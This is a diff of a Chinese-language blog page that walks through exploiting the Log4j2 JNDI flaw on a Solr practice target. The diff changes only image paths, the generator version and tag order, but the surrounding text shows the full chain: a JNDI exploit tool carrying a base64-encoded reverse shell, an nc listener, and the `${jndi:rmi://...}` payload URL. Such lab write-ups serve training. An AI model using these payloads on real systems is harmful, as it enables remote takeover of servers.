@@ -15,18 +15,18 @@
 <meta property="og:site_name" content="wang">
 <meta property="og:description" content="Apache Log4j是一个用于Java的日志记录库，其支持启动远程日志服务器。Apache Log4j 2.8.2之前的2.x版本中存在安全漏洞。攻击者可利用该漏洞执行任意代码。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2022/07/29/log4j2/image-20220729130204051.png">
-<meta property="og:image" content="http://example.com/2022/07/29/log4j2/image-20220729130404970.png">
-<meta property="og:image" content="http://example.com/2022/07/29/log4j2/image-20220729132016537.png">
-<meta property="og:image" content="http://example.com/2022/07/29/log4j2/image-20220729132748694.png">
-<meta property="og:image" content="http://example.com/2022/07/29/log4j2/image-20220729133008560.png">
+<meta property="og:image" content="http://example.com/log4j2/image-20220729130204051.png">
+<meta property="og:image" content="http://example.com/log4j2/image-20220729130404970.png">
+<meta property="og:image" content="http://example.com/log4j2/image-20220729132016537.png">
+<meta property="og:image" content="http://example.com/log4j2/image-20220729132748694.png">
+<meta property="og:image" content="http://example.com/log4j2/image-20220729133008560.png">
 <meta property="article:published_time" content="2022-07-29T04:58:12.000Z">
 <meta property="article:modified_time" content="2022-08-09T03:03:37.663Z">
 <meta property="article:author" content="Loin">
 <meta property="article:tag" content="w">
 <meta property="article:tag" content="log4j2">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2022/07/29/log4j2/image-20220729130204051.png">
+<meta name="twitter:image" content="http://example.com/log4j2/image-20220729130204051.png">
   
     <link rel="alternative" href="/atom.xml" title="wang" type="application/atom+xml">
   
@@ -44,7 +44,7 @@
 
   
 
-<meta name="generator" content="Hexo 6.2.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 <body>
   <div id="container" q-class="show:isCtnShow">
@@ -193,22 +193,15 @@
 <span id="more"></span>
 
 <p>1、开启靶场</p>
-<img src="/2022/07/29/log4j2/image-20220729130204051.png" class title="image-20220729130204051">
-
-
-
+<p><img src="/log4j2/image-20220729130204051.png" alt="image-20220729130204051"></p>
 <p>2、访问测试，靶机ip:8983</p>
-<img src="/2022/07/29/log4j2/image-20220729130404970.png" class title="image-20220729130404970">
-
-
-
+<p><img src="/log4j2/image-20220729130404970.png" alt="image-20220729130404970"></p>
 <p>3、测试反弹shell</p>
 <p>​	1.使用JNDI注入工具</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNi4xNTcvMjIyMjIgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 192.168.136.157</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>-C 后面是执行的命令，-A 是监听的ip</p>
-<img src="/2022/07/29/log4j2/image-20220729132016537.png" class title="image-20220729132016537">
-
+<p><img src="/log4j2/image-20220729132016537.png" alt="image-20220729132016537"></p>
 <p>​	2.攻击机开启监听</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 22222</span><br></pre></td></tr></table></figure>
 
@@ -216,10 +209,9 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8983/solr/admin/cores?action=$&#123;jndi:rmi://192.168.136.157:1099/hrd2kj&#125;</span><br></pre></td></tr></table></figure>
 
 <p>​	4.访问进行攻击</p>
-<img src="/2022/07/29/log4j2/image-20220729132748694.png" class title="image-20220729132748694">
-
+<p><img src="/log4j2/image-20220729132748694.png" alt="image-20220729132748694"></p>
 <p>​	5.攻击机已接收到反弹shell</p>
-<img src="/2022/07/29/log4j2/image-20220729133008560.png" class title="image-20220729133008560">
+<p><img src="/log4j2/image-20220729133008560.png" alt="image-20220729133008560"></p>
 
       
 
@@ -481,11 +473,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">log4j2</a>
+                <a href="javascript:void(0)" class="js-tag color5">namp</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">namp</a>
+                <a href="javascript:void(0)" class="js-tag color2">log4j2</a>
               </li>
              
               <li class="article-tag-list-item">
